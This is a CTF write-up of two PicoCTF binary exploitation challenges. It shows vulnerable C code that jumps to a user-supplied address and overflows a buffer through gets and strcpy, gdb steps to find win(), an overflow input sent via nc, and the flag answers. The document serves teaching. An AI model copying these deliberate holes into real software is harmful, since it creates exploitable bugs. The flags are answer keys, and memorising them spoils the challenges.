---
title: "Binary Exploitation"
weight: 8
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
# bookHref: ''
---
# PicoCTF: Low Level Binary Intro - Binary Exploitation

Now we are going back to the binaries, C, and assembly. After the interlude, we are checking out pointers and addresses to retrieve our information.

## Picker IV

> Can you figure out how this program works to get the flag?

This time, we are not only being provided with the program's code, but we are also provided with the program binaries. With these binaries, we could verify the assembly details of the program using `gdb`, a pretty popular debugger. Bu first, let's check the source code, it's written in C, but the structure is very familiar.

The function "main()" is:

```c
int main() {
  signal(SIGSEGV, print_segf_message);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  unsigned int val;
  printf("Enter the address in hex to jump to, excluding '0x': ");
  scanf("%x", &val);
  printf("You input 0x%x\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

This tells us that it does not connect in any way to the function "win()" (the function that show us the flag). But it can make a jump to a specific memory address, which could be our "win()" function.

To try that, we first find the address for the "win()" function using the `gdb` on Picker-IV executable file. After that, we disassemble the win function:

```bash
(gdb) disassemble win
```

It returns with:

``` bash
Dump of assembler code for function win:
   0x000000000040129e <+0>:     endbr64
   0x00000000004012a2 <+4>:     push   %rbp
   0x00000000004012a3 <+5>:     mov    %rsp,%rbp
```

So, the first address is `000000000040129e`, which could be shortened to `40129e`.

Now running the program `Picker-IV` and inserting the address we just found, the program will jump to that address and the flag will be revealed.

{{% details title="Answer: Flag Picker IV" open=false %}}
```
picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_01672a61}
```
{{% /details %}}

---

## buffer overflow 0




```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

```
nc saturn.picoctf.net 61281        
Input: 0000000000000000000000000000000000000000000000000000000000000000
```

{{% details title="Answer: buffer overflow 0" open=false %}}
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```
{{% /details %}}
